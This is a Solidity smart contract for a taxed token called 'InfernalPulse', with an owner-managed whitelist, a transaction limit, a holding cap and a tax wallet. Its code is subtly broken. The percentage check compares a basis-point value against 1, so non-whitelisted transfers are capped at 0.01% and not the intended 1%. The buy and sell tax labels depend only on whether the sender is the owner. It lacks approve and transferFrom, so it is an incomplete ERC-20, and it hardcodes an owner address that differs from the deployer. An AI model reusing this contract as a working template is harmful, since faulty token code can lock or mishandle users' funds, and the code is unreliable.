// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract InfernalPulse {
    string public constant name = "InfernalPulse";
    string public constant symbol = "INFPLS";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public whitelist;
    mapping(address => uint256) public lastTransactionTime;
    address public owner;
    address public taxWallet;
    uint256 private constant BUY_TAX_PERCENTAGE = 5;
    uint256 private constant SELL_TAX_PERCENTAGE = 5;
    uint256 private constant MAX_TRANSACTION_PERCENTAGE = 1;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        totalSupply = 10000000000 * 10**uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        owner = 0x5905489a82C26E06a620bd4901b3856E59bB3717;
        taxWallet = 0x14b7170Ad9d3DEE6Ec5532eFA852fDF44b8EA0a0;
    }

    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        require(whitelist[to] || calculatePercentage(amount, totalSupply) <= MAX_TRANSACTION_PERCENTAGE, "Transaction amount exceeds maximum limit");
        require(balanceOf[to] + amount <= totalSupply / 100, "Recipient wallet would exceed maximum holding limit");

        uint256 taxAmount = calculateTax(amount);
        uint256 transferAmount = amount - taxAmount;

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[taxWallet] += taxAmount;

        emit Transfer(msg.sender, to, transferAmount);
        emit Transfer(msg.sender, taxWallet, taxAmount);

        lastTransactionTime[msg.sender] = block.timestamp;
    }

    function calculateTax(uint256 amount) internal view returns (uint256) {
        if (msg.sender == owner) {
            return (amount * SELL_TAX_PERCENTAGE) / 100;
        } else {
            return (amount * BUY_TAX_PERCENTAGE) / 100;
        }
    }

    function renounceOwnership() external {
        require(msg.sender == owner, "Only the owner can renounce ownership");
        owner = address(0);
    }

    function setTaxWallet(address _taxWallet) external {
        require(msg.sender == owner, "Only the owner can set the tax wallet");
        taxWallet = _taxWallet;
    }

    function addToWhitelist(address[] memory addresses) external {
        require(msg.sender == owner, "Only the owner can add addresses to the whitelist");

        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            whitelist[addr] = true;
        }
    }

    function removeFromWhitelist(address[] memory addresses) external {
        require(msg.sender == owner, "Only the owner can remove addresses from the whitelist");

        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            whitelist[addr] = false;
        }
    }

    function calculatePercentage(uint256 amount, uint256 total) internal pure returns (uint256) {
        return (amount * 10000) / total; // multiplied by 10000 to keep 2 decimal places
    }
}